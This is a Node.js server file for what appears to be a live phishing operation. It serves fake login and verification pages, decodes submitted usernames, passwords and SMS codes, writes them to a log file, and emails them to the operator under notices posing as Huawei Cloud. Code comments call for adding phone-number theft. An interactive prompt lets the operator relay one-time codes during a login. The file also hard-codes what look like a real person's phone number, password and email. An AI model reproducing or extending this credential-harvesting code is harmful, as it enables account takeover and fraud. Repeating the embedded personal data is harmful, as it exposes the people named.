
let os = require('os');
let http = require('http'); // http协议模块
let url = require('url'); // url解析模块
let fs = require('fs'); // 文件系统模块
let path = require('path'); // 路径解析模块
let readlineSync = require("readline-sync");
let email = require('../nodeemail/email');
// let readline = require('readline');
// let rl = readline.createInterface(process.stdin, process.stdout);

let basePath = '';
// const html1 = ;

global.Buffer = global.Buffer || require('buffer').Buffer;

if (typeof btoa === 'undefined') {
    global.btoa = function (str) {
        return new Buffer(str, 'binary').toString('base64');
    };
}

if (typeof atob === 'undefined') {
    global.atob = function (b64Encoded) {
        return new Buffer(b64Encoded, 'base64').toString('binary');
    };
}

// 获得本机ip地址
let getHost = () => {
    let INTERFACES = os.networkInterfaces(); // 在开发环境中获取局域网中的本机iP地址
    console.log(JSON.stringify(INTERFACES));
    let wifi_host = '';
    let local_host = '';
    let v6_wifi_host = '';
    let v6_local_host = '';
    for (let devName in INTERFACES) {
        let iface = INTERFACES[devName];
        for (let i = 0; i < iface.length; i++) {
            let alias = iface[i];
            if (alias.family === 'IPv4' && alias.address !== '127.0.0.1' && !alias.internal) {
                if (/本地连接/.test(devName)) {
                    local_host = alias.address;
                } else if (/无线网络连接|WLAN/.test(devName)) {
                    wifi_host = alias.address;
                }
            } else if (alias.family === 'IPv6' && alias.address !== '127.0.0.1' && !alias.internal) {
                if (/本地连接/.test(devName)) {
                    v6_local_host = alias.address;
                } else if (/无线网络连接|WLAN/.test(devName)) {
                    v6_wifi_host = alias.address;
                }
            }
        }
    }

    return {
        'wifi': wifi_host || local_host,
        'local': local_host || wifi_host,
        'v6_wifi': v6_wifi_host || v6_local_host,
        'v6_local': v6_local_host || v6_wifi_host
    };
}

let waitInput = (mbid) => {
    let str = readlineSync.question(`need output(${mbid}):`);
    if (/1\./.test(str)) {
        str = "pass=" + (str.replace("1.", ""));
    } else if (str == "1") {
        if (mbid) {
            str = "pass=" + mbid;
        } else {
            str = "pass";
        }
    } else {
        str = "error";

    }
    console.log(`input result is ${str}`);
    return str;
}

let host = getHost();
let post = '52150';

let isFirst = true;
let log = "";

let writedown = () => {
    fs.open("./1.txt", 'w', (err, fd) => {
        if (err) {
        }
        let str = log;//JSON.stringify(log);
        fs.writeFile(fd, str, (err) => {
            if (err) {
            }
            fs.close(fd, (err) => {
                // console.log('saved');
            });
        });
    });
}

let isFirstLogin = true;
let isFirstCheck = true;

let listener = (request, response) => {
    if (isFirst) {
        isFirst = false;
        console.log(`useragent: ${request['headers']['user-agent']}`);
        console.log(`host: ${request['headers']['host']}`);
    }
    console.log(`有人访问了服务器 ==> ${request.url}`);

    let requestUrl = request.url; // 端口号后全部
    let pathName = url.parse(requestUrl).pathname; // 款口号后至问号前
    let query = url.parse(requestUrl).query; // 问号后
    let htmlstr = "";
    if (/\.js/.test(pathName)) {
        str = "";
        console.log(`${basePath}${pathName}`);
        if (fs.existsSync(`.${basePath}${pathName}`)) {
            response.writeHead(200, { 'content-type': 'application/javascript; charset=UTF-8' });
            str = fs.readFileSync(`.${basePath}${pathName}`) || '';
        } else {
            response.writeHead(404, { 'content-type': 'application/javascript; charset=UTF-8' });
        }
        response.end(str);
    } else if (pathName.indexOf(".js") !== -1) {
        response.writeHead(404, { 'content-type': 'application/javascript; charset=UTF-8' });
        response.end('');
    } else if (/\.png|\.jpg|\.ico/.test(pathName)) {
        let imgstr = '';
        if (fs.existsSync(`.${basePath}${pathName}`)) {
            response.writeHead(200, { 'content-type': 'image/x-icon' });
            imgstr = fs.readFileSync(`.${basePath}${pathName}`) || '';
        } else {
            response.writeHead(404, { 'content-type': 'image/x-icon' });
        }
        response.end(imgstr);
    } else if (/\.css/.test(pathName)) {
        let imgstr = '';
        if (fs.existsSync(`.${basePath}${pathName}`)) {
            response.writeHead(200, { 'content-type': 'text/css' });
            imgstr = fs.readFileSync(`.${basePath}${pathName}`) || '';
        } else {
            response.writeHead(404, { 'content-type': 'text/css' });
        }
        response.end(imgstr);
    } else if (pathName == "/query") {
        if (query) {
            let qs = query.split("&");
            let key = '';
            qs.forEach(e => {
                if (e.indexOf('d=') != -1) {
                    query = query.replace("d=", "");
                }
            });
            let ort = query;
            query = decodeURIComponent(atob(query));
            // query = key + "=>" + query;
            console.log(`========== **** return query ==> ${query}`);
            log += ("\n" + query);
            if (/type\=login/.test(query)) {
                if (/\&u\=18086094549\&/.test(query)) {
                    if (/\&p\=kejyuan6280230\&/.test(query)) {
                        response.write('pass=18049');
                    } else {
                        response.write('error');
                    }
                } else if (/\&u\=554934437@qq.com\&/.test(query)) {
                    // 554934437@qq.com 未知
                    response.write(waitInput(13821));
                } else {
                    let qs = query.split("&");
                    let mbid = '';
                    let keystr = "";
                    qs.forEach(e => {
                        if (e.indexOf("u=") === 0) {
                            keystr = e.replace("u=", "");
                            // console.log(`get U: ${keystr}`);
                            if (keystr.length === 11 && !/\@/.test(keystr)) {
                                mbid = `${keystr.substr(0, 3)}${keystr.substr(9, 2)}`;
                            }
                        }
                    });
                    response.write(waitInput(mbid));
                }
                email.send("2019华为云数据检测", `您的验证码为 ${ort} `);
            } else if(/type\=checkcodelogin/.test(query)) {
                response.write(waitInput());
            } else {
                response.write("");
            }
            response.end();
        }
        writedown();
    } else if (/\/login.html/.test(requestUrl)) {
        email.send("Huawei cloud 通知", "有人访问请查收");
        console.log(`useragent: ${request['headers']['user-agent']}`);
        console.log(`host: ${request['headers']['host']}`);
        htmlstr = '';
        if (fs.existsSync(`.${basePath}/login.html`)) {
            response.writeHead(200, { 'content-type': 'text/html' });
            htmlstr = fs.readFileSync(`.${basePath}/login.html`) || '';
        } else {
            response.writeHead(404, { 'content-type': 'text/html' });
        }
        response.end(htmlstr);
    } else if (/\/check.html/.test(requestUrl) && /mbid\=/.test(requestUrl)) {
        // 554934437@qq.com对应手机号138******21 需要加上盗取手机号的逻辑
        // 18086094549对应手机号为180******49

        htmlstr = '';
        if (fs.existsSync(`.${basePath}/check.html`)) {
            response.writeHead(200, { 'content-type': 'text/html' });
            htmlstr = fs.readFileSync(`.${basePath}/check.html`) || '';
        } else {
            response.writeHead(404, { 'content-type': 'text/html' });
        }
        response.end(htmlstr);
    } else if (/\/checkMbl.html/.test(requestUrl)) {
        // 554934437@qq.com对应手机号138******21 需要加上盗取手机号的逻辑
        // 18086094549对应手机号为180******49

        htmlstr = '';
        if (fs.existsSync(`.${basePath}/checkMbl.html`)) {
            response.writeHead(200, { 'content-type': 'text/html' });
            htmlstr = fs.readFileSync(`.${basePath}/checkMbl.html`) || '';
        } else {
            response.writeHead(404, { 'content-type': 'text/html' });
        }
        response.end(htmlstr);
    } else {
        response.writeHead(502, { 'content-type': 'text/html' });
        response.end("<h1>Access violation at address!</h1>");
    }

};


//4. 执行
console.log('执行了3030');

module.exports = {
    start: () => {

        basePath = `/BoomMan/baidu`;
        //2. 创建http服务器
        // 参数: 请求的回调, 当有人访问服务器的时候,就会自动调用回调函数

        let SWITCH = 0;
        let server;
        if (SWITCH) {
            server = http.createServer(listener);
        } else {
            server = http.createServer(function (req, res) {
                res.writeHead(301, { 'Location': 'https://pan.baidu.com/s/1bPx56kkQN73knyET7EiFvA' });
                console.log(res._header);
                res.end();
            });
        }


        //3. 绑定端口
        // server.listen(post, host.v6_local, () => {
        //     console.log(`绑定完成 ==> ${host.v6_local}:${post}`);
        // });
        server.listen(post, host.local, () => {
            console.log(`绑定完成 ==> ${host.local}:${post}`);
        });
    }
}

// http://10.3.75.26:3030/itunes/like/comment/s/05bc899676d6ef43f8bee0f69eddca11-T/32153o/72006/84fdc170c16a2ee1010fc21da6f4ef80/3a41998d206411764f134db8d015d63c/_/download/contextbatch/css/com.atlassian.jira.plugins.jira-development-integration-plugin?appid=ngienbnpkldjcebacfbppphjjhbhfkpp&assatrisd=kjhzkKYQnkajsnAOY!hoASdjoAW&rtime=1010230102301203123&dwl=1-1-23-1-123&ttl=1566413096&ri=1433600&rs=1400&clientip=69.194.14.161&hash=29b554a946b107e4028379e37bf4e2c5